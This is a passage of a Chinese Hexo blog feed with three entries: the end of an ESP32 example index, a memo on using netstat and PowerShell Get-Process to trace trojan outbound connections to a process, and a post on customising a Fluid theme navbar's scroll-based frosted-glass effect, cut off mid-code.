href="/ESP32-examples/18.security#18-5-3-tee-secure-ota">18.security &gt; 18.5.3 tee_secure_ota</a></td></tr><tr><td>tee_secure_storage</td><td>演示如何使用ESP-TEE框架提供的安全存储功能</td><td><a href="/ESP32-examples/18.security#18-5-4-tee-secure-storage">18.security &gt; 18.5.4 tee_secure_storage</a></td></tr></tbody></table><h3 id="bluetooth"><a href="#bluetooth" class="headerlink" title="bluetooth"></a>bluetooth</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>blufi</td><td>通过蓝牙配置Wi-Fi连接</td><td><a href="/ESP32-examples/19.bluetooth(WIP)#19-1-blufi-例程">19.bluetooth(WIP) &gt; 19.1 blufi 例程</a></td></tr><tr><td>a2dp_sink</td><td>实现经典蓝牙A2DP接收器功能</td><td><a href="/ESP32-examples/19.bluetooth(WIP)#19-2-a2dp-sink-例程（经典蓝牙）">19.bluetooth(WIP) &gt; 19.2 a2dp_sink 例程（经典蓝牙）</a></td></tr><tr><td>esp_ble_mesh</td><td>演示BLE Mesh网络的实现</td><td><a href="/ESP32-examples/19.bluetooth(WIP)#19-3-esp-ble-mesh-例程">19.bluetooth(WIP) &gt; 19.3 esp_ble_mesh 例程</a></td></tr></tbody></table><h3 id="peripherals"><a href="#peripherals" class="headerlink" title="peripherals"></a>peripherals</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>gpio/generic_gpio</td><td>GPIO基本配置和中断使用</td><td><a href="/ESP32-examples/20.peripherals(WIP)#20-1-gpio-generic-gpio-例程">20.peripherals(WIP) &gt; 20.1 gpio/generic_gpio 例程</a></td></tr><tr><td>i2c/i2c_basic</td><td>I2C主机基本操作</td><td><a href="/ESP32-examples/20.peripherals(WIP)#20-2-i2c-i2c-basic-例程">20.peripherals(WIP) &gt; 20.2 i2c/i2c_basic 例程</a></td></tr><tr><td>ledc/ledc_basic</td><td>LED PWM控制器基本使用</td><td><a href="/ESP32-examples/20.peripherals(WIP)#20-3-ledc-ledc-basic-例程">20.peripherals(WIP) &gt; 20.3 ledc/ledc_basic 例程</a></td></tr><tr><td>rmt/led_strip</td><td>使用RMT控制LED灯带</td><td><a href="/ESP32-examples/20.peripherals(WIP)#20-4-rmt-led-strip-例程">20.peripherals(WIP) &gt; 20.4 rmt/led_strip 例程</a></td></tr><tr><td>spi/spi_master</td><td>SPI主机基本操作</td><td><a href="/ESP32-examples/20.peripherals(WIP)#20-5-spi-spi-master-例程">20.peripherals(WIP) &gt; 20.5 spi/spi_master 例程</a></td></tr></tbody></table><h2 id="3-使用指南"><a href="#3-使用指南" class="headerlink" title="3. 使用指南"></a>3. 使用指南</h2><h3 id="3-1-如何查找例程"><a href="#3-1-如何查找例程" class="headerlink" title="3.1 如何查找例程"></a>3.1 如何查找例程</h3><ol><li>根据功能需求选择相应的目录分类</li><li>在对应分类下找到所需的例程</li><li>点击详细文档路径查看完整分析</li></ol><h3 id="3-2-如何参考例程"><a href="#3-2-如何参考例程" class="headerlink" title="3.2 如何参考例程"></a>3.2 如何参考例程</h3><ol><li>阅读例程的核心功能说明，确认是否符合需求</li><li>查看主要调用的函数和模块，了解实现原理</li><li>参考输入输出参数说明，理解例程的使用方式</li><li>根据适用场景判断是否适合当前项目</li></ol><h2 id="4-文档更新说明"><a href="#4-文档更新说明" class="headerlink" title="4. 文档更新说明"></a>4. 文档更新说明</h2><p>本文档将持续更新，随着更多例程的分析完成，将不断添加到本总览中。</p><h2 id="5-联系方式"><a href="#5-联系方式" class="headerlink" title="5. 联系方式"></a>5. 联系方式</h2><p>如有疑问或建议，请联系开发团队。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>外联端口简易查询</title>
    <link href="/pen/netstat/"/>
    <url>/pen/netstat/</url>
    
    <content type="html"><![CDATA[<p>排查外联木马</p><h3 id="一、netstat-ano-findstr-完整用法（排查网络连接）"><a href="#一、netstat-ano-findstr-完整用法（排查网络连接）" class="headerlink" title="一、netstat -ano | findstr 完整用法（排查网络连接）"></a>一、netstat -ano | findstr 完整用法（排查网络连接）</h3><p>这个命令核心用于<strong>查找可疑的网络连接</strong>，定位木马的外联IP/端口，以及对应的进程PID。</p><h4 id="1-基础补全与常用场景"><a href="#1-基础补全与常用场景" class="headerlink" title="1. 基础补全与常用场景"></a>1. 基础补全与常用场景</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 查找所有ESTABLISHED（已建立）的连接（重点排查外联）</span><br>netstat -ano | findstr <span class="hljs-string">&quot;ESTABLISHED&quot;</span><br><br><span class="hljs-comment"># 2. 按端口号查找（比如排查木马常用的8080、4444等可疑端口）</span><br>netstat -ano | findstr <span class="hljs-string">&quot;4444&quot;</span><br><br><span class="hljs-comment"># 3. 按IP地址查找（比如怀疑木马外联到192.168.1.100）</span><br>netstat -ano | findstr <span class="hljs-string">&quot;192.168.1.100&quot;</span><br><br><span class="hljs-comment"># 4. 按PID查找（已知可疑PID，查它的网络连接）</span><br>netstat -ano | findstr <span class="hljs-string">&quot;1234&quot;</span>  <span class="hljs-comment"># 1234为可疑进程PID</span><br></code></pre></td></tr></table></figure><h4 id="2-命令参数解释"><a href="#2-命令参数解释" class="headerlink" title="2. 命令参数解释"></a>2. 命令参数解释</h4><ul><li><code>netstat</code>：查看网络连接、路由表等网络相关信息；</li><li><code>-a</code>：显示所有连接和监听端口；</li><li><code>-n</code>：以数字形式显示IP和端口（不解析域名，速度更快）；</li><li><code>-o</code>：显示每个连接对应的进程PID（关键！关联进程）；</li><li><code>findstr</code>：Windows下的字符串查找命令，类似Linux的grep。</li></ul><h3 id="二、getprocess-完整用法（排查进程）"><a href="#二、getprocess-完整用法（排查进程）" class="headerlink" title="二、getprocess 完整用法（排查进程）"></a>二、getprocess 完整用法（排查进程）</h3><p>PowerShell 中 <code>Get-Process</code>（也常简写为 <code>gps</code> 或 <code>ps</code>）这个 cmdlet 的用法，它是 PowerShell 里用于查看和管理系统进程的核心命令，我会从基础到进阶帮你讲清楚。</p><h4 id="1-查看所有进程"><a href="#1-查看所有进程" class="headerlink" title="1. 查看所有进程"></a>1. 查看所有进程</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看系统中所有正在运行的进程（最基础用法）</span><br><span class="hljs-built_in">Get-Process</span><br><br><span class="hljs-comment"># 简写形式（效果完全相同）</span><br><span class="hljs-built_in">gps</span><br><span class="hljs-built_in">ps</span><br></code></pre></td></tr></table></figure><p>执行后会返回所有进程的关键信息，包括：</p><ul><li><code>Handles</code>：进程打开的句柄数</li><li><code>NPM(K)</code>：非分页内存大小（KB）</li><li><code>PM(K)</code>：分页内存大小（KB）</li><li><code>WS(K)</code>：工作集大小（KB）</li><li><code>CPU(s)</code>：进程占用的 CPU 时间</li><li><code>Id</code>：进程 ID（PID）</li><li><code>ProcessName</code>：进程名称</li></ul><h4 id="2-按进程名筛选"><a href="#2-按进程名筛选" class="headerlink" title="2. 按进程名筛选"></a>2. 按进程名筛选</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看所有名为 &quot;notepad&quot;（记事本）的进程</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-name</span> notepad<br><br><span class="hljs-comment"># 支持通配符（*），查看所有以 &quot;chrome&quot; 开头的进程（比如 Chrome 浏览器）</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-name</span> chrome*<br><br><span class="hljs-comment"># 同时查看多个进程（用逗号分隔）</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-name</span> notepad, chrome, explorer<br></code></pre></td></tr></table></figure><h4 id="3-按进程-PID-筛选"><a href="#3-按进程-PID-筛选" class="headerlink" title="3. 按进程 PID 筛选"></a>3. 按进程 PID 筛选</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看 PID 为 1234 的进程（替换为实际 PID）</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-id</span> <span class="hljs-number">1234</span><br><br><span class="hljs-comment"># 同时查看多个 PID 的进程</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-id</span> <span class="hljs-number">1234</span>, <span class="hljs-number">5678</span>, <span class="hljs-number">9012</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：如果指定的 PID 不存在，会抛出 “找不到进程” 的错误，可加 <code>-ErrorAction SilentlyContinue</code> 忽略错误。</p></blockquote><h4 id="4-只获取指定属性"><a href="#4-只获取指定属性" class="headerlink" title="4. 只获取指定属性"></a>4. 只获取指定属性</h4><p>默认输出的信息较多，可通过 <code>Select-Object</code>（简写 <code>select</code>）筛选需要的属性：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 只查看进程名、PID、CPU 占用率</span><br><span class="hljs-built_in">Get-Process</span> chrome | <span class="hljs-built_in">Select-Object</span> ProcessName, id, CPU<br><br><span class="hljs-comment"># 查看进程的所有可用属性（方便自定义筛选）</span><br><span class="hljs-built_in">Get-Process</span> notepad | <span class="hljs-built_in">Get-Member</span><br></code></pre></td></tr></table></figure><h4 id="5-排序进程（按内存-CPU-占用）"><a href="#5-排序进程（按内存-CPU-占用）" class="headerlink" title="5. 排序进程（按内存/CPU 占用）"></a>5. 排序进程（按内存/CPU 占用）</h4><p>用 <code>Sort-Object</code>（简写 <code>sort</code>）对进程按资源占用排序，方便找到耗资源的进程：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 按内存（WS）降序排列，只显示前 10 个进程</span><br><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Sort-Object</span> WS <span class="hljs-literal">-Descending</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-First</span> <span class="hljs-number">10</span><br><br><span class="hljs-comment"># 按 CPU 占用降序排列</span><br><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Sort-Object</span> CPU <span class="hljs-literal">-Descending</span> | <span class="hljs-built_in">Select-Object</span> ProcessName, Id, CPU<br></code></pre></td></tr></table></figure><h4 id="6-结合-Where-Object-筛选（更灵活）"><a href="#6-结合-Where-Object-筛选（更灵活）" class="headerlink" title="6. 结合 Where-Object 筛选（更灵活）"></a>6. 结合 Where-Object 筛选（更灵活）</h4><p>用 <code>Where-Object</code>（简写 <code>?</code>）设置更复杂的筛选条件，比如内存占用超过 100MB 的进程：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 筛选内存（WS）大于 100MB（102400 KB）的进程</span><br><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.WS <span class="hljs-operator">-gt</span> <span class="hljs-number">102400</span> &#125; | <span class="hljs-built_in">Select-Object</span> ProcessName, Id, WS<br><br><span class="hljs-comment"># 筛选进程名包含 &quot;java&quot; 且 CPU 占用大于 0 的进程</span><br><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.ProcessName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;java&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.CPU <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure><h4 id="7-终止进程（结合-Stop-Process）"><a href="#7-终止进程（结合-Stop-Process）" class="headerlink" title="7. 终止进程（结合 Stop-Process）"></a>7. 终止进程（结合 Stop-Process）</h4><p><code>Get-Process</code> 常和 <code>Stop-Process</code> 配合终止进程（需注意权限）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 终止所有名为 &quot;notepad&quot; 的进程（谨慎使用）</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Name</span> notepad | <span class="hljs-built_in">Stop-Process</span><br><br><span class="hljs-comment"># 终止指定 PID 的进程，加 -Confirm 会弹出确认提示</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Id</span> <span class="hljs-number">1234</span> | <span class="hljs-built_in">Stop-Process</span> <span class="hljs-literal">-Confirm</span><br></code></pre></td></tr></table></figure><h3 id="三、查看远程计算机进程"><a href="#三、查看远程计算机进程" class="headerlink" title="三、查看远程计算机进程"></a>三、查看远程计算机进程</h3><p>如果需要查看远程计算机的进程，需满足：</p><ol><li>本地和远程计算机开启 WinRM 服务；</li><li>有远程计算机的管理员权限。</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看远程计算机（IP 或主机名）的进程</span><br><span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.1.100&quot;</span> <span class="hljs-literal">-Credential</span> (<span class="hljs-built_in">Get-Credential</span>)<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><code>netstat -ano | findstr</code> 核心补全逻辑：后面接<strong>端口/IP/PID/连接状态</strong>（如ESTABLISHED），用于定位可疑网络连接；</li><li> <code>Get-Process</code> 是 PowerShell 查看进程的核心命令，支持简写 <code>gps</code>/<code>ps</code>，基础用法是直接执行（查所有进程）、按 <code>-Name</code>/<code>-Id</code> 筛选；</li><li>进阶用法可结合 <code>Select-Object</code>（选属性）、<code>Sort-Object</code>（排序）、<code>Where-Object</code>（复杂筛选），实现精准定位目标进程；</li><li>可配合 <code>Stop-Process</code> 终止进程，也可通过 <code>-ComputerName</code> 查看远程进程（需满足权限和服务条件）。</li><li>排查木马时，先通过<code>netstat</code>找外联PID，再通过<code>getprocess</code>定位PID对应的程序，是核心思路。</li></ol>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爆改导航栏</title>
    <link href="/blog/navbar_css/"/>
    <url>/blog/navbar_css/</url>
    
    <content type="html"><![CDATA[    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-e1998169" role="button" aria-expanded="false" aria-controls="collapse-e1998169">        <div class="fold-arrow">▶</div>前期尝试      </div>      <div class="fold-collapse collapse" id="collapse-e1998169">        <div class="fold-content">          <p>导航栏在页首时会隐藏，而阴影还会在。下面是简单粗暴地将阴影设为零的方法。<br>位置<code>Blog\themes\fluid\source\css\_pages\_base\_widget\header.styl</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.navbar</span><br>  <span class="hljs-attribute">background-color</span> transparent<br>  <span class="hljs-attribute">font-size</span> <span class="hljs-number">0.875rem</span><br>  <span class="hljs-attribute">box-shadow</span> <span class="hljs-number">0</span> <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">0</span> rgba(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.16</span>), <span class="hljs-number">0</span> <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">0</span> rgba(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.12</span>)<br>  -webkit-<span class="hljs-attribute">box-shadow</span> <span class="hljs-number">0</span> <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">0</span> rgba(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.16</span>), <span class="hljs-number">0</span> <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">0</span> rgba(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.12</span>)<br></code></pre></td></tr></table></figure><p>修改为<code>0 0px 0px 0 rgba(0, 0, 0, 0.16), 0 0px 0px 0 rgba(0, 0, 0, 0.12)</code></p>        </div>      </div>    </div><h2 id="导航栏变化原理"><a href="#导航栏变化原理" class="headerlink" title="导航栏变化原理"></a>导航栏变化原理</h2><ol><li><strong>初始化</strong>：页面加载时，<code>registerNavbarEvent</code> 函数被调用，注册滚动事件监听器    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-15a38580" role="button" aria-expanded="false" aria-controls="collapse-15a38580">        <div class="fold-arrow">▶</div>滚动事件监听器      </div>      <div class="fold-collapse collapse" id="collapse-15a38580">        <div class="fold-content">          <p>在 <code>Blog\themes\fluid\source\js\events.js</code> 文件中，<code>registerNavbarEvent</code> 函数实现了滚动位置检测：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 注册导航栏滚动事件</span><br><span class="hljs-attr">registerNavbarEvent</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> navbar = jQuery(<span class="hljs-string">&#x27;#navbar&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (navbar.length === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">var</span> submenu = jQuery(<span class="hljs-string">&#x27;#navbar .dropdown-menu&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (navbar.offset().top &gt; <span class="hljs-number">0</span>) &#123;<br>    navbar.removeClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>    submenu.removeClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>  &#125;<br>  <span class="hljs-comment">// 监听滚动事件</span><br>  Fluid.utils.listenScroll(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 当滚动超过50px时添加毛玻璃效果类，否则移除</span><br>    navbar[navbar.offset().top &gt; <span class="hljs-number">50</span> ? <span class="hljs-string">&#x27;addClass&#x27;</span> : <span class="hljs-string">&#x27;removeClass&#x27;</span>](<span class="hljs-string">&#x27;top-nav-collapse&#x27;</span>);<br>    submenu[navbar.offset().top &gt; <span class="hljs-number">50</span> ? <span class="hljs-string">&#x27;addClass&#x27;</span> : <span class="hljs-string">&#x27;removeClass&#x27;</span>](<span class="hljs-string">&#x27;dropdown-collapse&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (navbar.offset().top &gt; <span class="hljs-number">0</span>) &#123;<br>      navbar.removeClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>      submenu.removeClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      navbar.addClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>      submenu.removeClass(<span class="hljs-string">&#x27;navbar-dark&#x27;</span>);<br>    &#125;<br>  &#125;);<br>  <span class="hljs-comment">// 其他代码...</span><br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div></li><li><strong>滚动检测</strong>：当用户滚动页面时，<code>listenScroll</code> 函数触发回调    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-83eebc9c" role="button" aria-expanded="false" aria-controls="collapse-83eebc9c">        <div class="fold-arrow">▶</div>滚动监听      </div>      <div class="fold-collapse collapse" id="collapse-83eebc9c">        <div class="fold-content">          <p>在 <code>Blog\themes\fluid\source\js\utils.js</code> 文件中，<code>listenScroll</code> 函数实现了滚动事件的防抖处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 监听滚动事件（带防抖）</span><br><span class="hljs-attr">listenScroll</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> dbc = <span class="hljs-keyword">new</span> Debouncer(callback);<br>  <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;scroll&#x27;</span>, dbc, <span class="hljs-literal">false</span>);<br>  dbc.handleEvent();<br>  <span class="hljs-keyword">return</span> dbc;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div></li><li><strong>类名切换</strong>：JavaScript 根据滚动位置（<code>navbar.offset().top &gt; 50</code>）添加或移除 <code>top-nav-collapse</code> 类</li><li><strong>毛玻璃效果</strong>：CSS 检测到 <code>top-nav-collapse</code> 类后，应用 <code>ground-glass</code> 函数实现毛玻璃效果</li><li><strong>响应式变化</strong>：当滚动回到顶部时，移除 <code>top-nav-collapse</code> 类，毛玻璃效果消失</li></ol><h2 id="关键参数"><a href="#关键参数" class="headerlink" title="关键参数"></a>关键参数</h2><ul><li><strong>滚动阈值</strong>：50px（当滚动超过这个值时触发毛玻璃效果）</li><li><strong>毛玻璃效果类</strong>：<code>top-nav-collapse</code>（导航栏）和 <code>dropdown-collapse</code>（下拉菜单）</li><li><strong>毛玻璃配置</strong>：<ul><li><code>$navbar-glass-px</code>：毛玻璃模糊像素</li><li><code>$navbar-bg-color</code>：导航栏背景颜色</li><li><code>$navbar-glass-alpha</code>：毛玻璃透明度</li></ul></li></ul><h2 id="核心修改"><a href="#核心修改" class="headerlink" title="核心修改"></a>核心修改</h2><p>在 <code>Blog\themes\fluid\source\js\events.js</code> 文件中：</p><ul><li><strong>实现平滑滚动效果</strong>：根据滚动位置计算滚动比例（0-1）</li><li><strong>平滑改变毛玻璃透明度</strong>：滚动时不透明度从0逐渐增加</li><li><strong>注释掉页首取消毛玻璃效果的代码</strong>：确保毛玻璃效果在整个滚动过程中保持</li><li><strong>从配置文件自动获取主题色</strong>：</li><li><strong>设置非线性滚动效果</strong>：修改系数为先慢后快的指数变化<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exponent = <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 指数系数，大于1时实现开始慢后面快的效果</span><br><span class="hljs-keyword">var</span> nonlinearScrollRatio = <span class="hljs-built_in">Math</span>.pow(scrollRatio, exponent);<br></code></pre></td></tr></table></figure></li></ul>    <div class="fold">      <div class="fold-title fold-success collapsed" data-toggle="collapse" href="#collapse-05eef982" role="button" aria-expanded="false" aria-controls="collapse-05eef982">        <div class="fold-arrow">▶</div>核心代码      </div>      <div class="fold-collapse collapse" id="collapse-05eef982">        <div class="fold-content">          <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js">Fluid.utils.listenScroll(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> scrollTop = jQuery(<span class="hljs-built_in">window</span>).scrollTop();<br>  <span class="hljs-keyword">var</span> maxScroll = <span class="hljs-number">350</span>; <span class="hljs-comment">// 最大滚动距离，超过此值后效果不再变化</span><br>  <span class="hljs-keyword">var</span> scrollRatio = <span class="hljs-built_in">Math</span>.min(scrollTop / maxScroll, <span class="hljs-number">1</span>); <span class="hljs-comment">// 滚动比例，范围0-1</span><br>  <br>  <span class="hljs-comment">// 非线性滚动比例计算（开始慢，后面快）</span><br>  <span class="hljs-keyword">var</span> exponent = <span class="hljs-number">1.3</span>; <span class="hljs-comment">// 指数系数，大于1时实现开始慢后面快的效果</span><br>  <span class="hljs-keyword">var</span> nonlinearScrollRatio = <span class="hljs-built_in">Math</span>.pow(scrollRatio, exponent);<br>  <br>  <span class="hljs-comment">// 平滑添加/移除类（根据滚动比例）</span><br>  <span class="hljs-keyword">if</span> (scrollRatio &gt; <span class="hljs-number">0</span>) &#123;<br>navbar.addClass(<span class="hljs-string">&#x27;top-nav-collapse&#x27;</span>);<br>submenu.addClass(<span class="hljs-string">&#x27;dropdown-collapse&#x27;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>navbar.removeClass(<span class="hljs-string">&#x27;top-nav-collapse&#x27;</span>);<br>submenu.removeClass(<span class="hljs-string">&#x27;dropdown-collapse&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 平滑改变导航栏高度（根据滚动比例）</span><br>  <span class="hljs-keyword">var</span> defaultPadding = <span class="hljs-number">12</span>; <span class="hljs-comment">// 默认 padding</span><br>  <span class="hljs-keyword">var</span> collapsedPadding = <span class="hljs-number">5</span>; <span class="hljs-comment">// 折叠后 padding</span><br>  <span class="hljs-keyword">var</span> currentPadding = defaultPadding - (defaultPadding - collapsedPadding) * nonlinearScrollRatio;<br>  navbar.css(<span class="hljs-string">&#x27;padding-top&#x27;</span>, currentPadding + <span class="hljs-string">&#x27;px&#x27;</span>);<br>  navbar.css(<span class="hljs-string">&#x27;padding-bottom&#x27;</span>, currentPadding + <span class="hljs-string">&#x27;px&#x27;</span>);<br>  <br>  <span class="hljs-comment">// 平滑改变毛玻璃效果的透明度（根据滚动比例）</span><br>  <span class="hljs-keyword">var</span> alpha = scrollRatio * <span class="hljs-number">0.7</span>; <span class="hljs-comment">// 最大不透明度</span><br>  <span class="hljs-comment">// 从 CSS 变量中获取当前主题的导航栏背景色</span><br>  <span class="hljs-keyword">var</span> navbarBgColor = getComputedStyle(<span class="hljs-built_in">document</span>.documentElement).getPropertyValue(<span class="hljs-string">&#x27;--navbar-bg-color&#x27;</span>).trim();<br>  <span class="hljs-comment">// 将十六进制颜色转换为 RGB</span><br>  <span class="hljs-keyword">var</span> rgbColor = hexToRgb(navbarBgColor);<br>  <span class="hljs-keyword">if</span> (rgbColor) &#123;<br>navbar.css(<span class="hljs-string">&#x27;background&#x27;</span>, <span class="hljs-string">&#x27;rgba(&#x27;</span> + rgbColor.r + <span class="hljs-string">&#x27;, &#x27;</span> + rgbColor.g + <span class="hljs-string">&#x27;, &#x27;</span> + rgbColor.b + <span class="hljs-string">&#x27;, &#x27;</span> + alpha + <span class="hljs-string">&#x27;)&#x27;</span>);<br>  &#125;<br>  navbar.css(<span class="hljs-string">&#x27;-webkit-backdrop-filter&#x27;</span>, <span 